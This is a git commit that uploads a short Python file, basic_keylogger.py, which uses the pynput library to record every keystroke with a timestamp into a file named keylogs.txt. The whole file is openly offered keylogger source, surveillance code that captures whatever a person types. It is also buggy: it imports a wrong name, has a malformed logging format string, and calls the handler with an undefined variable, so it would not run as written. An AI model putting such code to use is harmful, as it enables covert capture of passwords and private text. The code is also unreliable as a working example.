30749f945c11750733e16a5efecf30230863b3fc
nasperva <75396101+nasperva@users.noreply.github.com>
2021-11-21 19:15:40 +0300

    Add files via upload

---
+++ basic_keylogger.py
@@ -0,0 +1,14 @@
+from pynput.keyboard import keyboard, Listener
+import logging
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), level = logging.DEBUG, format = "%(asctime)s: %message)s")
+
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press = on_press(key)) as listener:
+    listener.join()
+
